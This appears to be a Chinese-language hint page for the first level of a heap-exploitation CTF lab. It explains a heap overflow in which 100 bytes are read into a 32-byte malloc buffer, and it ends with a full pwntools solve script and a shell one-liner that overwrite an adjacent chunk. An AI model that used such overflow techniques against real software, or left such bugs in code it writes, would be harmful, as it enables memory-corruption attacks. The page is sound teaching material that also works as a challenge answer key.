# Level 1: 提示系统

如果你卡关了，可以查看下面的提示。提示按从少到多的顺序排列，建议尽量自己先思考！

---

<details>
<summary>💡 提示 1: 漏洞在哪里？</summary>

仔细阅读源码，找出 `read(0, chunk1, 100)` 这一行。

**问题**：`chunk1` 有多大？`read()` 会读取多少字节？

**答案**：
- `chunk1 = malloc(32)` - 32 字节
- `read(0, chunk1, 100)` - 读取 100 字节！

100 > 32，这就是**堆溢出**漏洞！
</details>

---

<details>
<summary>💡 提示 2: chunk1 和 chunk2 的距离？</summary>

运行程序看看它们的地址：

```bash
./vuln
```

输入任意数据（比如 "test"），输出会显示：
```
[+] Allocated chunk1 at: 0x5555555592a0 (size: 32)
[+] Allocated chunk2 at: 0x5555555592c0 (size: 32)
```

计算：`chunk2 - chunk1 = 0x20 = 32 字节`

**关键点**：用户数据指针之间的距离 = 请求的大小
</details>

---

<details>
<summary>💡 提示 3: 如何覆盖 chunk2？</summary>

需要填满 chunk1 的 32 字节，然后继续写入就能覆盖 chunk2！

**Payload 结构**：
```
[32 字节填充] + [目标数据]
```

示例：
```python
payload = b"A" * 32 + b"pwned!"
```

**为什么是 32 字节？**
- `chunk1` 的用户数据区域是 32 字节
- 填满这 32 字节后，继续写入就会进入 `chunk2`
</details>

---

<details>
<summary>💡 提示 4: 字符串终止问题</summary>

`strcmp()` 比较的是 C 字符串，需要遇到 `\0` 才会结束。

**问题**：`read()` 不会自动添加 `\0`，但程序会打印：

```c
printf("[+] chunk2 content: %s\n", chunk2);
```

**解决方案**：

方案 1：在 payload 中添加 null
```python
payload = b"A" * 32 + b"pwned!\0"
```

方案 2：添加换行符
```python
payload = b"A" * 32 + b"pwned!\n"
```

方案 3：使用 `sendline()`（自动添加 `\n`）
```python
p.sendline(b"A" * 32 + b"pwned!")
```
</details>

---

<details>
<summary>💡 提示 5: 使用 GDB 调试</summary>

如果还是不行，用 GDB 看看实际发生了什么：

```bash
gdb ./vuln
```

在 GDB 中：
```
(gdb) break main
(gdb) run

# 执行到 malloc
(gdb) next
(gdb) next

# 查看堆
(gdb) heap

# 查看具体内存
(gdb) x/20gx 0x5555555592a0

# 继续执行到 read 之后
(gdb) next
# 输入 payload

# 再次查看
(gdb) x/20gx 0x5555555592a0
```

**应该看到**：
- chunk1 区域被 'A' (0x41) 填满
- chunk2 区域包含 "pwned!" (0x70776e656421)
</details>

---

<details>
<summary>💡 提示 6: 完整的 Python 脚本</summary>

如果需要完整的解题脚本：

```python
#!/usr/bin/env python3
from pwn import *

# 启动进程
p = process('./vuln')

# 构建 payload
payload = b"A" * 32 + b"pwned!\n"

# 发送
p.sendline(payload)

# 交互
p.interactive()
```

或者更简单，直接用命令行：
```bash
python3 -c "print('A'*32 + 'pwned!')" | ./vuln
```

**记得先创建 flag 文件**：
```bash
echo "flag{heap_overflow_master_level1}" > flag.txt
```
</details>

---

<details>
<summary>💡 提示 7: 内存布局图解</summary>

如果还不清楚，看看这个完整的内存布局：

```
地址              内容
────────────────────────────────────
0x555555559290   [chunk1 元数据: 0x00, 0x31]
0x5555555592a0   [chunk1 数据 - 32 字节]
                 ├─ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x5555555592c0   [chunk2 元数据: 0x30, 0x31]
0x5555555592d0   [chunk2 数据 - 32 字节]
                 ├─ pwned!
```

**关键**：
- chunk1 的数据从 0x5555555592a0 开始
- chunk2 的数据从 0x5555555592d0 开始
- 距离 = 0x30 (包含元数据)
- 用户数据距离 = 0x20 (32 字节)

**写入 100 字节时的效果**：
```
0x5555555592a0   [A...A] ← 32 字节填充 chunk1
                 [pwned!] ← 覆盖 chunk2 的开头
                 [......] ← 继续写入
```
</details>

---

<details>
<summary>🔍 深入：为什么 chunk2 - chunk1 = 32？</summary>

你可能会疑惑：chunk 不是有元数据吗？为什么还是 32？

**答案**：`malloc()` 返回的是**用户数据指针**，不是 chunk 起始地址！

**内存中的实际布局**：
```
chunk1 (完整大小 0x30):
  元数据: 0x10 字节
  用户数据: 0x20 字节 ← malloc() 返回这个地址

chunk2 (完整大小 0x30):
  元数据: 0x10 字节
  用户数据: 0x20 字节 ← malloc() 返回这个地址
```

所以：
```
chunk2_ptr - chunk1_ptr = 0x20 (32 字节)
```

但是 chunk 的**实际距离**（包括元数据）是：
```
(chunk2_ptr - 0x10) - (chunk1_ptr - 0x10) = 0x30 (48 字节)
```

**结论**：从用户数据指针看，距离 = 请求大小！
</details>

---

<details>
<summary>🎯 挑战：更深入的理解</summary>

完成基础挑战后，尝试这些更深入的问题：

**问题 1**：如果分配的大小不是 32 呢？
```c
chunk1 = malloc(16);
chunk2 = malloc(16);
// chunk2 - chunk1 = ?
```

**问题 2**：如果分配不同大小呢？
```c
chunk1 = malloc(32);
chunk2 = malloc(64);
// chunk2 - chunk1 = ?
```

**问题 3**：如果中间有其他分配呢？
```c
a = malloc(32);
b = malloc(32);
c = malloc(32);
// 能通过 a 的溢出控制 c 吗？
```

**问题 4**：如果先 free 再 malloc 呢？
```c
chunk1 = malloc(32);
free(chunk1);
chunk2 = malloc(32);
// chunk2 会重用 chunk1 的位置吗？
```

用 GDB 实验看看！
</details>

---

## 总结

### 关键要点

1. **漏洞**：`read(0, chunk1, 100)` 读取 100 字节到 32 字节缓冲区
2. **距离**：chunk1 和 chunk2 的用户数据相距 32 字节
3. **Payload**：`[32 字节填充] + [目标数据]`
4. **字符串终止**：记得添加 `\0` 或 `\n`

### 下一步

如果你已经完成了挑战，继续学习：
- [Level 2: Use-After-Free](../../level02_uaf/)
- [堆内部原理](theory.md)
- [完整的利用指南](walkthrough.md)

---

**记住**：理解比记住答案更重要！ 🎯
